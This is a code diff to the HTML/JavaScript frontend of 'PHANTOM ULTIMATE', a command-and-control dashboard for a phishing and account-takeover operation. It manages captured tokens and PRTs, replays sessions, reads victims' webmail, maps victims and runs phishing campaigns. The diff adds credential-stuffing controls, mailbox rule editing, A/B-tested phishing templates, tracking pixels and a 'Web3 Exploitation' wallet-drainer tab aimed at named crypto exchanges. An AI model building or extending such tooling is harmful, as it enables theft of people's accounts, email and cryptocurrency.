@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>PHANTOM ULTIMATE — Full C2 Dashboard</title>
+    <title>PHANTOM ULTIMATE — Full C2 Suite</title>
     <!-- Chart.js -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <!-- Leaflet -->
@@ -50,6 +50,7 @@
             --modal-pre-bg: rgba(241, 245, 249, 0.6);
             --leaflet-attribution: #1e293b;
         }
+
         /* ----- RESET & BASE ----- */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -69,6 +70,8 @@
         ::-webkit-scrollbar-thumb { background: #2d3748; border-radius: 4px; }
         ::-webkit-scrollbar-thumb:hover { background: #4a5568; }
         .app { max-width: 1400px; margin: 0 auto; width: 100%; }
+
+        /* ----- TOP NAV ----- */
         .top-nav {
             display: flex;
             justify-content: space-between;
@@ -122,38 +125,113 @@
             text-decoration: none !important;
             border: 1px solid transparent;
         }
-        .btn-theme { background: var(--btn-bg); color: var(--text-primary); border: 1px solid var(--border-color); }
+        .btn-theme {
+            background: var(--btn-bg);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
         .btn-theme:hover { background: var(--btn-hover); }
-        .btn-export { background: linear-gradient(135deg, #818cf8, #6366f1); color: #fff; border: none; }
+        .btn-export {
+            background: linear-gradient(135deg, #818cf8, #6366f1);
+            color: #fff;
+            border: none;
+        }
         .btn-export:hover { filter: brightness(1.1); transform: scale(1.02); }
-        .btn-device { background: transparent; color: #fbbf24; border-color: #fbbf24; box-shadow: 0 0 8px rgba(251, 191, 36, 0.3); animation: goldGlow 2s infinite alternate; }
-        @keyframes goldGlow { 0% { box-shadow: 0 0 5px rgba(251, 191, 36, 0.3); } 100% { box-shadow: 0 0 20px rgba(251, 191, 36, 0.8); } }
+        .btn-device {
+            background: transparent;
+            color: #fbbf24;
+            border-color: #fbbf24;
+            box-shadow: 0 0 8px rgba(251, 191, 36, 0.3);
+            animation: goldGlow 2s infinite alternate;
+        }
+        @keyframes goldGlow {
+            0% { box-shadow: 0 0 5px rgba(251, 191, 36, 0.3); }
+            100% { box-shadow: 0 0 20px rgba(251, 191, 36, 0.8); }
+        }
         .btn-device:hover { background: rgba(251, 191, 36, 0.15); }
-        .btn-telegram { background: transparent; color: #06b6d4; border-color: #06b6d4; box-shadow: 0 0 8px rgba(6, 182, 212, 0.3); animation: tgGlow 2s infinite alternate; }
-        @keyframes tgGlow { 0% { box-shadow: 0 0 5px rgba(6, 182, 212, 0.3); } 100% { box-shadow: 0 0 20px rgba(6, 182, 212, 0.8); } }
+        .btn-telegram {
+            background: transparent;
+            color: #06b6d4;
+            border-color: #06b6d4;
+            box-shadow: 0 0 8px rgba(6, 182, 212, 0.3);
+            animation: tgGlow 2s infinite alternate;
+        }
+        @keyframes tgGlow {
+            0% { box-shadow: 0 0 5px rgba(6, 182, 212, 0.3); }
+            100% { box-shadow: 0 0 20px rgba(6, 182, 212, 0.8); }
+        }
         .btn-telegram:hover { background: rgba(6, 182, 212, 0.15); }
-        .status-indicator { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--text-muted); margin-left: 4px; }
-        .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; }
-        .dot.online { background: #34d399; box-shadow: 0 0 8px #34d39966; animation: statusPulse 2s infinite ease-in-out; }
-        @keyframes statusPulse { 0% { box-shadow: 0 0 4px #34d39944; } 50% { box-shadow: 0 0 16px #34d399; } 100% { box-shadow: 0 0 4px #34d39944; } }
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-left: 4px;
+        }
+        .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+        .dot.online {
+            background: #34d399;
+            box-shadow: 0 0 8px #34d39966;
+            animation: statusPulse 2s infinite ease-in-out;
+        }
+        @keyframes statusPulse {
+            0% { box-shadow: 0 0 4px #34d39944; }
+            50% { box-shadow: 0 0 16px #34d399; }
+            100% { box-shadow: 0 0 4px #34d39944; }
+        }
         .dot.offline { background: #f87171; box-shadow: 0 0 8px #f8717166; }
+
+        /* ----- REST OF DASHBOARD ----- */
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin: 24px 0; }
-        .card { background: var(--bg-card); backdrop-filter: blur(12px); border: 1px solid var(--border-color); border-radius: 16px; padding: 20px; transition: all 0.25s ease; }
-        .card:hover { border-color: rgba(122, 162, 247, 0.3); transform: translateY(-2px); box-shadow: 0 8px 24px var(--shadow); }
+        .card {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px;
+            transition: all 0.25s ease;
+        }
+        .card:hover {
+            border-color: rgba(122, 162, 247, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px var(--shadow);
+        }
         .card .label { font-size: 12px; text-transform: uppercase; color: var(--text-label); letter-spacing: 0.5px; margin-bottom: 6px; }
         .card .value { font-size: 28px; font-weight: 700; line-height: 1.2; }
         .card .sub { font-size: 13px; color: var(--text-muted); margin-top: 6px; }
-        .tabs { display: flex; gap: 4px; background: var(--bg-card); backdrop-filter: blur(8px); border-radius: 12px; padding: 6px; margin: 30px 0 20px; flex-wrap: wrap; border: 1px solid var(--border-color); }
-        .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 10px 18px; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; gap: 8px; }
+        .tabs {
+            display: flex; gap: 4px; background: var(--bg-card);
+            backdrop-filter: blur(8px);
+            border-radius: 12px;
+            padding: 6px; margin: 30px 0 20px; flex-wrap: wrap;
+            border: 1px solid var(--border-color);
+        }
+        .tab-btn {
+            background: transparent; border: none; color: var(--text-muted); padding: 10px 18px;
+            border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex; align-items: center; gap: 8px;
+        }
         .tab-btn:hover { color: var(--text-primary); background: rgba(255,255,255,0.05); }
         .tab-btn.active { background: #2d3748; color: #fff; box-shadow: 0 4px 12px var(--shadow); }
         .tab-content { display: none; animation: fadeIn 0.35s ease; }
         .tab-content.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
-        .table-wrap { overflow-x: auto; background: var(--bg-card); backdrop-filter: blur(8px); border: 1px solid var(--border-color); border-radius: 12px; margin-top: 12px; }
+        .table-wrap {
+            overflow-x: auto; background: var(--bg-card);
+            backdrop-filter: blur(8px);
+            border: 1px solid var(--border-color);
+            border-radius: 12px; margin-top: 12px;
+        }
         table { width: 100%; border-collapse: collapse; font-size: 14px; }
         th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border-color); }
-        th { background: var(--table-header-bg); color: var(--text-muted); font-weight: 500; text-transform: uppercase; font-size: 11px; }
+        th { background: var(--table-header-bg); color: var(--text-muted); font-weight: 500; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
         tr:last-child td { border-bottom: none; }
         tr:hover td { background: rgba(255,255,255,0.02); }
         .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; font-weight: 600; }
@@ -161,7 +239,12 @@
         .badge-yellow { background: #78350f; color: #fbbf24; }
         .badge-red { background: #7f1d1d; color: #f87171; }
         .badge-gray { background: #1f2937; color: #9ca3af; }
-        .btn { display: inline-flex; align-items: center; gap: 6px; background: var(--btn-bg); backdrop-filter: blur(4px); border: 1px solid var(--border-color); color: var(--text-primary); padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; }
+        .btn {
+            display: inline-flex; align-items: center; gap: 6px; background: var(--btn-bg);
+            backdrop-filter: blur(4px); border: 1px solid var(--border-color);
+            color: var(--text-primary); padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 500;
+            cursor: pointer; transition: all 0.2s ease;
+        }
         .btn:hover { background: var(--btn-hover); }
         .btn-primary { background: #7aa2f7; color: #0a0d14; border-color: #7aa2f7; }
         .btn-primary:hover { background: #93b4f9; }
@@ -172,25 +255,51 @@
         .btn-sm { padding: 4px 12px; font-size: 12px; }
         .form-group { margin: 12px 0; }
         .form-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 4px; }
-        .form-control { width: 100%; background: var(--input-bg); backdrop-filter: blur(4px); border: 1px solid var(--input-border); border-radius: 8px; padding: 10px 12px; color: var(--text-primary); font-size: 14px; transition: border-color 0.2s; }
+        .form-control {
+            width: 100%; background: var(--input-bg);
+            backdrop-filter: blur(4px);
+            border: 1px solid var(--input-border);
+            border-radius: 8px; padding: 10px 12px; color: var(--text-primary); font-size: 14px;
+            transition: border-color 0.2s;
+        }
         .form-control:focus { outline: none; border-color: #7aa2f7; box-shadow: 0 0 0 3px rgba(122, 162, 247, 0.15); }
         select.form-control { appearance: none; }
         textarea.form-control { resize: vertical; min-height: 80px; }
-        .chart-container { background: var(--bg-card); backdrop-filter: blur(8px); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin: 12px 0; height: 280px; }
+        .chart-container {
+            background: var(--bg-card); backdrop-filter: blur(8px);
+            border: 1px solid var(--border-color); border-radius: 12px;
+            padding: 20px; margin: 12px 0; height: 280px;
+        }
         .chart-container canvas { width: 100% !important; height: 100% !important; }
         #mapContainer { height: 500px; border-radius: 12px; background: var(--bg-body); }
         #mapContainer .leaflet-control-attribution { color: var(--leaflet-attribution); }
         #mapContainer .leaflet-tile-pane { filter: invert(1) hue-rotate(180deg); }
-        .glowing-dot { filter: drop-shadow(0 0 6px #34d399) drop-shadow(0 0 12px #34d399); animation: pulse-green 2s infinite ease-in-out; }
-        @keyframes pulse-green { 0% { opacity: 0.6; transform: scale(0.8); } 50% { opacity: 1; transform: scale(1.2); } 100% { opacity: 0.6; transform: scale(0.8); } }
+        .glowing-dot {
+            filter: drop-shadow(0 0 6px #34d399) drop-shadow(0 0 12px #34d399);
+            animation: pulse-green 2s infinite ease-in-out;
+        }
+        @keyframes pulse-green {
+            0% { opacity: 0.6; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.6; transform: scale(0.8); }
+        }
         .glowing-dot circle { filter: inherit; }
-        @media (max-width: 640px) { .grid { grid-template-columns: 1fr 1fr; } .top-nav { flex-direction: column; align-items: stretch; } .action-buttons { justify-content: space-between; } }
+
+        @media (max-width: 640px) {
+            .grid { grid-template-columns: 1fr 1fr; }
+            .top-nav { flex-direction: column; align-items: stretch; }
+            .action-buttons { justify-content: space-between; }
+        }
         .loading { display: flex; justify-content: center; align-items: center; padding: 40px; color: var(--text-muted); }
         .loading::after { content: ''; width: 24px; height: 24px; border: 3px solid var(--border-color); border-top-color: #7aa2f7; border-radius: 50%; animation: spin 0.8s linear infinite; margin-left: 12px; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(6px); display: none; justify-content: center; align-items: center; z-index: 1000; }
         .modal-overlay.open { display: flex; }
-        .modal { background: var(--modal-bg); backdrop-filter: blur(16px); border: 1px solid var(--border-color); border-radius: 20px; padding: 30px; max-width: 700px; width: 90%; max-height: 80vh; overflow-y: auto; }
+        .modal {
+            background: var(--modal-bg); backdrop-filter: blur(16px);
+            border: 1px solid var(--border-color); border-radius: 20px;
+            padding: 30px; max-width: 700px; width: 90%; max-height: 80vh; overflow-y: auto;
+        }
         .modal h2 { margin-bottom: 16px; }
         .modal .close-btn { float: right; background: transparent; border: none; color: var(--text-muted); font-size: 24px; cursor: pointer; }
         .modal .close-btn:hover { color: var(--text-primary); }
@@ -245,7 +354,7 @@
         <div class="card"><div class="label">Last Capture</div><div class="value" id="statLastCapture">—</div></div>
     </div>
 
-    <!-- TABS (all 15 categories) -->
+    <!-- TABS (All 17) -->
     <div class="tabs">
         <button class="tab-btn active" data-tab="tab-overview">📊 Overview</button>
         <button class="tab-btn" data-tab="tab-analytics">📈 Analytics</button>
@@ -261,6 +370,9 @@
         <button class="tab-btn" data-tab="tab-integrations">🔗 Integrations</button>
         <button class="tab-btn" data-tab="tab-opsec">🛡️ OPSEC</button>
         <button class="tab-btn" data-tab="tab-visuals">📊 Visuals</button>
+        <button class="tab-btn" data-tab="tab-system">📊 System</button>
+        <button class="tab-btn" data-tab="tab-crypto">💰 Crypto</button>
+        <button class="tab-btn" data-tab="tab-test">🧪 Test</button>
         <button class="tab-btn" data-tab="tab-settings">⚙️ Settings</button>
         <button class="tab-btn" data-tab="tab-plugins">🧩 Plugins</button>
         <button class="tab-btn" data-tab="tab-campaign">📢 Campaigns</button>
@@ -326,27 +438,57 @@
     <div id="tab-replay" class="tab-content">
         <h2 class="mb-12">Replay Engine</h2>
         <div class="form-group"><label>Select log file</label><select class="form-control" id="replayLogSelect"><option value="">— Choose —</option></select></div>
-        <div class="flex"><button class="btn btn-primary" id="generateReplay">🎯 Generate Script</button><button class="btn btn-success" id="headlessReplay">🤖 Headless Replay</button><button class="btn btn-warning" id="scheduleReplay">⏰ Schedule</button></div>
+        <div class="flex">
+            <button class="btn btn-primary" id="generateReplay">🎯 Generate Script</button>
+            <button class="btn btn-success" id="headlessReplay">🤖 Headless Replay</button>
+            <button class="btn btn-warning" id="scheduleReplay">⏰ Schedule</button>
+        </div>
         <div id="replayOutput" class="mt-12" style="display:none;"><div class="card"><div class="flex-between"><span><strong>Replay Script</strong></span><button class="copy-btn" id="copyReplayScript">📋 Copy</button></div><pre id="replayScriptContent" style="white-space:pre-wrap;word-break:break-all;"></pre><div class="text-muted" id="replayMeta"></div></div></div>
+
+        <!-- Credential Stuffing -->
+        <div class="card mt-12">
+            <h3>Credential Stuffing</h3>
+            <div class="form-group"><label>Select token to test</label><select id="stuffingToken"></select></div>
+            <div class="flex"><button class="btn btn-primary" id="startStuffing">▶️ Start Stuffing</button></div>
+            <div id="stuffingResult" class="mt-12 text-muted"></div>
+        </div>
     </div>
 
-    <!-- TAB: WEBMAIL -->
+    <!-- TAB: WEBMAIL (with extensions: calendar, contacts, tasks, rules) -->
     <div id="tab-webmail" class="tab-content">
         <h2 class="mb-12">Webmail Access</h2>
         <div class="form-group"><label>Access Token</label><input class="form-control" id="webmailToken" placeholder="Enter token or leave blank to use from Vault" /></div>
-        <div class="flex mb-12"><button class="btn btn-sm" id="webmailLoadFolders">📂 Folders</button><button class="btn btn-sm" id="webmailLoadInbox">📥 Inbox</button><button class="btn btn-sm" id="webmailLoadSent">📤 Sent</button></div>
-        <div class="table-wrap"><table><thead><tr><th>Subject</th><th>From</th><th>Received</th><th>Actions</th></tr></thead><tbody id="webmailTableBody"></tbody></table></div>
+        <div class="flex mb-12">
+            <button class="btn btn-sm" id="webmailLoadFolders">📂 Folders</button>
+            <button class="btn btn-sm" id="webmailLoadInbox">📥 Inbox</button>
+            <button class="btn btn-sm" id="webmailLoadSent">📤 Sent</button>
+            <button class="btn btn-sm" id="webmailLoadCalendar">📅 Calendar</button>
+            <button class="btn btn-sm" id="webmailLoadContacts">👥 Contacts</button>
+            <button class="btn btn-sm" id="webmailLoadTasks">📋 Tasks</button>
+        </div>
+        <div class="table-wrap" id="webmailTableWrap">
+            <table><thead><tr><th>Subject</th><th>From</th><th>Received</th><th>Actions</th></tr></thead><tbody id="webmailTableBody"></tbody></table>
+        </div>
         <div class="card mt-12"><h3>Send Email</h3>
             <div class="form-group"><label>To (comma separated)</label><input class="form-control" id="webmailTo" /></div>
             <div class="form-group"><label>Subject</label><input class="form-control" id="webmailSubject" /></div>
             <div class="form-group"><label>Body (HTML)</label><textarea class="form-control" id="webmailBody" rows="4"></textarea></div>
             <button class="btn btn-success" id="webmailSend">📨 Send</button>
         </div>
+        <!-- Rules -->
+        <div class="card mt-12">
+            <h3>Mail Rules</h3>
+            <div class="flex"><button class="btn btn-sm" id="loadMailRules">Load Rules</button><button class="btn btn-sm btn-primary" id="addMailRule">Add Rule</button></div>
+            <div class="table-wrap"><table><thead><tr><th>Name</th><th>Condition</th><th>Action</th><th>Actions</th></tr></thead><tbody id="mailRulesBody"></tbody></table></div>
+        </div>
     </div>
 
     <!-- TAB: AUTOMATION -->
     <div id="tab-automation" class="tab-content">
-        <div class="flex-between mb-12"><h2>Automation Rules (Self-Learning)</h2><button class="btn btn-sm" id="suggestRulesAI">💡 Suggest Rules (AI)</button></div>
+        <div class="flex-between mb-12">
+            <h2>Automation Rules (Self-Learning)</h2>
+            <button class="btn btn-sm" id="suggestRulesAI">💡 Suggest Rules (AI)</button>
+        </div>
         <div class="card">
             <div class="form-group"><label>Rule Name</label><input class="form-control" id="ruleName" /></div>
             <div class="form-group"><label>Trigger</label><select class="form-control" id="ruleTrigger"><option value="new_capture">New Capture</option><option value="new_token">New Token</option><option value="new_refresh_token">New Refresh Token</option><option value="new_prt">New PRT</option><option value="new_device_flow">Device Flow Approved</option><option value="new_anomaly">Anomaly Detected</option><option value="replay_success">Replay Success</option></select></div>
@@ -357,7 +499,7 @@
         <div class="table-wrap"><table><thead><tr><th>Name</th><th>Trigger</th><th>Action</th><th>Enabled</th><th>Actions</th></tr></thead><tbody id="rulesTableBody"></tbody></table></div>
     </div>
 
-    <!-- TAB: MAP -->
+    <!-- TAB: MAP (with heatmap toggle) -->
     <div id="tab-map" class="tab-content">
         <h2 class="mb-12">Live Victim Map</h2>
         <div class="flex mb-12"><button class="btn btn-sm" id="toggleHeatmap">🔥 Toggle Heatmap</button></div>
@@ -431,8 +573,52 @@
             <button class="btn btn-sm" id="showTimeline">📈 Show Timeline</button>
             <button class="btn btn-sm" id="showLiveStream">📡 Live Stream</button>
         </div>
-        <div class="chart-container" id="timelineChartContainer" style="display:none; height:250px;"><canvas id="timelineChart"></canvas></div>
+        <div class="chart-container" id="timelineChartContainer" style="display:none; height:250px;">
+            <canvas id="timelineChart"></canvas>
+        </div>
         <div id="liveStreamContainer" style="display:none; background:var(--bg-card); border-radius:12px; padding:16px; max-height:300px; overflow-y:auto; font-family:monospace; font-size:12px;"></div>
+    </div>
+
+    <!-- TAB: SYSTEM -->
+    <div id="tab-system" class="tab-content">
+        <h2 class="mb-12">System Resources</h2>
+        <div class="grid" style="grid-template-columns:1fr 1fr 1fr;">
+            <div class="card"><div class="label">CPU</div><div class="value" id="sysCpu">0%</div></div>
+            <div class="card"><div class="label">RAM</div><div class="value" id="sysRam">0%</div></div>
+            <div class="card"><div class="label">Network (kb/s)</div><div class="value" id="sysNet">0</div></div>
+        </div>
+        <div class="chart-container"><canvas id="sysChart"></canvas></div>
+    </div>
+
+    <!-- TAB: CRYPTO -->
+    <div id="tab-crypto" class="tab-content">
+        <h2>Web3 Exploitation</h2>
+        <div class="card">
+            <div class="form-group"><label>Enable Wallet Drainer</label><input type="checkbox" id="enableDrainer" /></div>
+            <div class="form-group"><label>Target Domains (comma)</label><input class="form-control" id="drainTargets" placeholder="uniswap.org, pancakeswap.finance" /></div>
+            <button class="btn btn-primary" id="saveCryptoConfig">Save</button>
+        </div>
+        <div class="table-wrap"><table><thead><tr><th>Address</th><th>Balance</th><th>Status</th></tr></thead><tbody id="cryptoTable"></tbody></table></div>
+    </div>
+
+    <!-- TAB: TEST -->
+    <div id="tab-test" class="tab-content">
+        <h2>Test & Simulation</h2>
+        <div class="card">
+            <h3>Simulate Victim</h3>
+            <button class="btn btn-primary" id="simulateVictim">▶ Start Simulation</button>
+            <div id="simulationResult" class="mt-12 text-muted"></div>
+        </div>
+        <div class="card">
+            <h3>API Tester</h3>
+            <div class="flex">
+                <select class="form-control" id="testMethod" style="width:100px;"><option>GET</option><option>POST</option></select>
+                <input class="form-control" id="testEndpoint" placeholder="/api/status" style="flex:1;" />
+                <button class="btn btn-primary" id="sendTestRequest">Send</button>
+            </div>
+            <div class="form-group"><label>Body (JSON)</label><textarea class="form-control" id="testBody" rows="2"></textarea></div>
+            <pre id="testResponse" style="background:var(--modal-pre-bg); padding:12px; border-radius:8px; margin-top:12px;"></pre>
+        </div>
     </div>
 
     <!-- TAB: SETTINGS -->
@@ -461,6 +647,18 @@
             <button class="btn btn-primary" id="createCampaign">🚀 Launch Campaign</button>
         </div>
         <div class="table-wrap"><table><thead><tr><th>Name</th><th>Domain</th><th>Sent</th><th>Opens</th><th>Clicks</th><th>Captures</th><th>Status</th></tr></thead><tbody id="campaignTableBody"></tbody></table></div>
+        <!-- A/B Testing -->
+        <div class="card mt-12">
+            <h3>A/B Test Variants</h3>
+            <div class="form-group"><label>Variant A Template</label><textarea class="form-control" id="campaignVariantA"></textarea></div>
+            <div class="form-group"><label>Variant B Template</label><textarea class="form-control" id="campaignVariantB"></textarea></div>
+            <button class="btn btn-primary" id="launchABTest">🚀 Launch A/B Test</button>
+        </div>
+        <div class="card mt-12">
+            <h3>Tracking Pixel</h3>
+            <button class="btn btn-sm" id="generatePixel">Generate Pixel</button>
+            <input class="form-control mt-12" id="pixelCode" readonly />
+        </div>
     </div>
 </div>
 
@@ -475,19 +673,24 @@
 
 <script>
     // ============================================================
-    //  🥔 PHANTOM ULTIMATE — Full Frontend JavaScript
-    //  Includes: AI, Automation, Integrations, OPSEC, Visuals, etc.
+    //  🥔 PHANTOM ULTIMATE — FULL SUITE (All Phases)
     // ============================================================
     (function() {
         'use strict';
         const API_BASE = '';
         const WS_URL = (window.location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host + '/ws';
-        let ws = null, logsData = [], vaultData = [], deviceData = [], prtData = [], analyticsData = null;
-        let overviewChart = null, analyticsChart = null, timelineChart = null;
+
+        // ----- STATE -----
+        let ws = null;
+        let logsData = [], vaultData = [], deviceData = [], prtData = [], analyticsData = null;
+        let overviewChart = null, analyticsChart = null, timelineChart = null, sysChartInstance = null;
         let rulesData = [], map = null, grid = null, heatmapLayer = null, liveStreamInterval = null;
         let webmailToken = '';
+        let currentUser = { id: 'user_' + Math.random().toString(36).substr(2,9), role: 'admin', name: 'Potato' };
+        let otherUsers = {};
+        let pushSubscription = null;
 
-        // ---- Helpers ----
+        // ----- HELPERS -----
         function apiFetch(endpoint, options = {}) {
             return fetch(API_BASE + endpoint, {
                 ...options,
@@ -505,18 +708,25 @@
         function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
         function showNotification(title, body) { if (!('Notification' in window)) return; if (Notification.permission==='granted') new Notification(title,{body}); else if (Notification.permission!=='denied') Notification.requestPermission().then(p=>{if(p==='granted') new Notification(title,{body});}); }
 
-        // ---- WebSocket ----
+        // ----- WEBSOCKET -----
         function connectWS() {
             if (ws && ws.readyState===WebSocket.OPEN) return;
             try {
                 ws = new WebSocket(WS_URL);
-                ws.onopen = () => { document.getElementById('statusDot').className='dot online'; document.getElementById('statusText').textContent='Online'; };
+                ws.onopen = () => {
+                    document.getElementById('statusDot').className='dot online';
+                    document.getElementById('statusText').textContent='Online';
+                    ws.send(JSON.stringify({ type: 'join', userId: currentUser.id, name: currentUser.name }));
+                };
                 ws.onmessage = (e) => {
                     try {
                         const data = JSON.parse(e.data);
                         if (data.type === 'newLog') { showNotification('📁 New Log', `File: ${data.file}`); if (document.getElementById('tab-logs').classList.contains('active')) loadLogs(); loadStats(); }
                         if (data.type === 'newCapture') { showNotification('🔐 New Capture', `Email: ${data.email||'N/A'}`); loadStats(); if (document.getElementById('tab-vault').classList.contains('active')) loadVault(); }
                         if (data.type === 'newAnomaly') { showNotification('⚠️ Anomaly Detected', `IP: ${data.ip}`); }
+                        if (data.type === 'cursor') { updateCursor(data.userId, data.x, data.y); }
+                        if (data.type === 'join') { otherUsers[data.userId] = { name: data.name }; }
+                        if (data.type === 'leave') { delete otherUsers[data.userId]; const cursor = document.getElementById('cursor-'+data.userId); if (cursor) cursor.remove(); }
                     } catch(e){}
                 };
                 ws.onclose = () => { document.getElementById('statusDot').className='dot offline'; document.getElementById('statusText').textContent='Offline'; setTimeout(connectWS,3000); };
@@ -524,7 +734,33 @@
             } catch(e) { setTimeout(connectWS,3000); }
         }
 
-        // ---- Theme ----
+        // ----- CURSOR -----
+        function sendCursor(x, y) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'cursor', userId: currentUser.id, x, y }));
+            }
+        }
+        function updateCursor(userId, x, y) {
+            let cursor = document.getElementById('cursor-' + userId);
+            if (!cursor) {
+                cursor = document.createElement('div');
+                cursor.id = 'cursor-' + userId;
+                cursor.style.position = 'fixed';
+                cursor.style.pointerEvents = 'none';
+                cursor.style.zIndex = '9999';
+                cursor.style.width = '12px';
+                cursor.style.height = '12px';
+                cursor.style.borderRadius = '50%';
+                cursor.style.backgroundColor = '#7aa2f7';
+                cursor.style.boxShadow = '0 0 8px #7aa2f7';
+                cursor.style.transform = 'translate(-50%, -50%)';
+                document.body.appendChild(cursor);
+            }
+            cursor.style.left = (x * window.innerWidth) + 'px';
+            cursor.style.top = (y * window.innerHeight) + 'px';
+        }
+
+        // ----- THEME -----
         function toggleTheme() {
             const body=document.body;
             const current=body.getAttribute('data-theme');
@@ -535,7 +771,7 @@
         }
         document.getElementById('themeToggle').addEventListener('click', toggleTheme);
 
-        // ---- Tabs ----
+        // ----- TABS -----
         document.querySelectorAll('.tab-btn').forEach(btn=>{
             btn.addEventListener('click', function(){
                 document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
@@ -557,13 +793,16 @@
                 else if (tab==='tab-integrations') loadIntegrations();
                 else if (tab==='tab-opsec') loadOPSEC();
                 else if (tab==='tab-visuals') loadVisuals();
+                else if (tab==='tab-system') loadSystemStats();
+                else if (tab==='tab-crypto') loadCryptoConfig();
+                else if (tab==='tab-test') loadTest();
                 else if (tab==='tab-settings') loadSettings();
                 else if (tab==='tab-plugins') loadPlugins();
                 else if (tab==='tab-campaign') loadCampaigns();
             });
         });
 
-        // ---- Stats ----
+        // ----- STATS -----
         async function loadStats() {
             try {
                 const data=await apiFetch('/api/status');
@@ -579,7 +818,7 @@
             } catch(e){}
         }
 
-        // ---- Overview (Gridstack) ----
+        // ----- OVERVIEW -----
         function loadOverview() {
             if (!grid) {
                 grid=GridStack.init({column:4, cellHeight:'auto', minRow:3, acceptWidgets:true, animate:true, float:true});
@@ -610,7 +849,7 @@
             } catch(e){}
         }
 
-        // ---- Analytics ----
+        // ----- ANALYTICS -----
         async function loadAnalytics() {
             try {
                 const data=await apiFetch('/api/analytics');
@@ -630,7 +869,7 @@
             } catch(e){}
         }
 
-        // ---- Logs (with regex) ----
+        // ----- LOGS -----
         let allLogs=[];
         async function loadLogs() {
             try {
@@ -670,7 +909,7 @@
         document.getElementById('resetLogFilters').addEventListener('click',()=>{document.getElementById('logSearch').value=''; document.getElementById('logDateFrom').value=''; document.getElementById('logDateTo').value=''; document.getElementById('logFilterHasCreds').value=''; applyLogFilters();});
         document.getElementById('exportAllLogs').addEventListener('click',()=>{window.open('/api/export/all','_blank');});
 
-        // ---- Vault ----
+        // ----- VAULT -----
         async function loadVault() {
             try {
                 const stats=await apiFetch('/api/vault/stats');
@@ -690,7 +929,7 @@
         document.getElementById('scanVault').addEventListener('click',async()=>{try{await apiFetch('/api/vault/scan',{method:'POST'}); loadVault(); showModal('Scan Complete','Vault rescanned.');}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('healthCheckVault').addEventListener('click',async()=>{try{const data=await apiFetch('/api/vault/healthcheck',{method:'POST'}); let html='<table><tr><th>Token</th><th>Status</th><th>User</th></tr>'; data.results.forEach(r=>{html+=`<tr><td>${escapeHtml(r.token)}</td><td>${r.status==='valid'?'✅ Valid':'❌ Invalid'}</td><td>${escapeHtml(r.user||r.username||'—')}</td></tr>`;}); html+='</table>'; showModal('Health Check Results',html);}catch(e){showModal('Error',escapeHtml(e.message));}});
 
-        // ---- Device ----
+        // ----- DEVICE -----
         async function loadDevice() {
             try {
                 const data=await apiFetch('/api/device/history');
@@ -702,7 +941,7 @@
         }
         window.useDeviceToken=async function(id){try{const data=await apiFetch('/api/device/use',{method:'POST',body:JSON.stringify({session_id:id})}); showModal('Token Details',`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`);}catch(e){showModal('Error',escapeHtml(e.message));}};
 
-        // ---- PRT ----
+        // ----- PRT -----
         async function loadPRT() {
             try {
                 const data=await apiFetch('/api/prt/list');
@@ -718,7 +957,7 @@
         document.getElementById('healthAllPRT').addEventListener('click',async()=>{try{const data=await apiFetch('/api/prt/health-all',{method:'POST'}); let html='<table><tr><th>Username</th><th>Status</th></tr>'; data.results.forEach(r=>{html+=`<tr><td>${escapeHtml(r.username||'—')}</td><td>${r.valid?'✅ Valid':'❌ Invalid'}</td></tr>`;}); html+='</table>'; showModal('Health All Results',html);}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('exchangeAllPRT').addEventListener('click',async()=>{try{const data=await apiFetch('/api/prt/exchange-all',{method:'POST'}); let html='<table><tr><th>Username</th><th>Success</th><th>Token (truncated)</th></tr>'; data.results.forEach(r=>{html+=`<tr><td>${escapeHtml(r.username||'—')}</td><td>${r.success?'✅':'❌'}</td><td>${escapeHtml(r.access_token||r.error||'—')}</td></tr>`;}); html+='</table>'; showModal('Exchange All Results',html); loadPRT();}catch(e){showModal('Error',escapeHtml(e.message));}});
 
-        // ---- Replay ----
+        // ----- REPLAY -----
         function loadReplaySelect(){ loadLogs(); }
         document.getElementById('generateReplay').addEventListener('click',generateReplay);
         document.getElementById('headlessReplay').addEventListener('click',async()=>{const f=document.getElementById('replayLogSelect').value; if(!f){showModal('Error','Select a log file');return;} await headlessReplayLog(f);});
